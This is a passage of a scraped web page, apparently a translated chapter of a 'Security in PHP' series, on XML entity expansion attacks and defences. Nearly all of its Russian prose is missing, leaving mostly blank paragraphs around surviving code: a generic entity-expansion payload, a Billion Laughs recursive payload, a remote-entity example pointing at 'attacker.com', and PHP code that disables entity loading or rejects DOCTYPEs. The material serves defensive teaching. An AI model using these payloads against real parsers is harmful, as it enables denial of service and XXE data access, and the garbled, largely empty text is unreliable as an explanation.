</h3><br><p>      XML-     . </p><br><h3 id="obschee-rasshirenie-suschnosti">    </h3><br><p>   ‚Äî ¬´  ¬ª.        .      ,     ,   XML-          XML. </p><br><pre> <code class="hljs cs">&lt;?xml version=<span class="hljs-string"><span class="hljs-string">"1.0"</span></span>?&gt; &lt;!DOCTYPE results [&lt;!ENTITY <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-string"><span class="hljs-string">"SOME_SUPER_LONG_STRING"</span></span>&gt;]&gt; &lt;results&gt; &lt;result&gt;Now include &amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>; lots of times to expand the <span class="hljs-keyword"><span class="hljs-keyword">in</span></span>-memory size of <span class="hljs-keyword"><span class="hljs-keyword">this</span></span> XML structure&lt;/result&gt; &lt;result&gt;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>; &amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>; &amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>; &amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>; Keep it going... &amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;&amp;<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>;...&lt;/result&gt; &lt;/results&gt;</code> </pre> <br><p>              ,     XML-  ,        .      ,    DOS-.  :  XML     ,         . </p><br><h3 id="rekursivnoe-rasshirenie-suschnosti">    </h3><br><p>           XML,       .       (resolve)     ,      .  ,      XML-     (Billion Laughs Attack). </p><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE results [ &lt;!ENTITY x0 "BOOM!"&gt; &lt;!ENTITY x1 "&amp;x0;&amp;x0;"&gt; &lt;!ENTITY x2 "&amp;x1;&amp;x1;"&gt; &lt;!ENTITY x3 "&amp;x2;&amp;x2;"&gt; &lt;!-- Add the remaining sequence from x4...x100 (or boom) --&gt; &lt;!ENTITY x99 "&amp;x98;&amp;x98;"&gt; &lt;!ENTITY boom "&amp;x99;&amp;x99;"&gt; ]&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span>Explode in 3...2...1...&amp;boom;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p> XML-    XML,       .    ,    ,    2^100       ‚Äî <code>&amp;x0;</code>  .  ! </p><br><h3 id="udalyonnoe-rasshirenie-suschnosti">    </h3><br><p>         XML DTD.       ,  XML-    HTTP-.      XXE (  XML-),         .  ,   XXE,       . </p><br><p>   :    XML-    HTTP-      .   ,      ,       HTTP-.  ,       - ,      ,            . </p><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE results [ &lt;!ENTITY cascade SYSTEM "http://attacker.com/entity1.xml"&gt; ]&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span>3..2..1...&amp;cascade<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>      DOS-   :            ,    .       :   (resolve)     XML-            .        XXE-,    DOS-. </p><br><h3 id="zaschita-ot-rasshireniya-xml-suschnostey"> <em>   XML-</em> </h3><br><p>    ,       XXE-.    (resolution)  XML-   ,   ;   HTTP-    ,      XML- PHP,    libxml2. </p><br><p> <code>libxml_disable_entity_loader(true);</code> </p> <br><p>   PHP            XML DTD  DOCTYPE. PHP   <code>LIBXML_NOENT</code> ,     <code>DOMDocument::$substituteEntities</code> ,     . ,       . </p><br><p> libxml2       ,     ,   .             ;   -    ,   libxml2  . </p><br><p>  ,    ‚Äî     XML-    .          ,    .  ,    ‚Äî    XML,    DOCTYPE.  ,      DOCTYPE          , . .   HTTPS-.       ,   PHP        DTD.  ,     <code>libxml_disable_entity_loader(TRUE)</code> ,     ,     ,         (node value).        . </p><br><pre> <code class="php hljs">$dom = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> DOMDocument; $dom-&gt;loadXML($xml); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($dom-&gt;childNodes <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $child) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($child-&gt;nodeType === XML_DOCUMENT_TYPE_NODE) { <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> \InvalidArgumentException( <span class="hljs-string"><span class="hljs-string">'Invalid XML: Detected use of illegal DOCTYPE'</span></span> ); } }</code> </pre> <br><p> ,      <code>libxml_disable_entity_loader</code>  TRUE,         (resolve)    XML.       ,  XML-    libxml2,            . </p><br><p>     SimpleXML,    ,     <code>simplexml_import_dom()</code>      DOMDocument. </p><br><h2 id="soap-injection"> SOAP Injection </h2><br><p> TBD </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/352440/">https://habr.com/ru/post/352440/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../352430/index.html">Tarantool application: stored procedures</a></li>
<li><a href="../352432/index.html">Linux distribution from scratch to build Docker images - our experience with dappdeps</a></li>
<li><a href="../352434/index.html">Ransomware is gaining strength</a></li>
<li><a href="../352436/index.html">Blondes, monsters and artificial intelligence addictions</a></li>
<li><a href="../352438/index.html">Java Puzzlers NG S02: Wonderful and Wonderful</a></li>
<li><a href="../352442/index.html">The book "Security in PHP" (part 3). Cross-site scripting (XSS)</a></li>
<li><a href="../352444/index.html">The book Security in PHP (part 4). The lack of security at the transport level (HTTPS, TLS and SSL)</a></li>
<li><a href="../352446/index.html">The book "Security in PHP" (Part 5). Lack of entropy for random values</a></li>
<li><a href="../352448/index.html">Manual cipher LS47</a></li>
<li><a href="../352450/index.html">The history of the mobile Internet: 1991 - our days</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>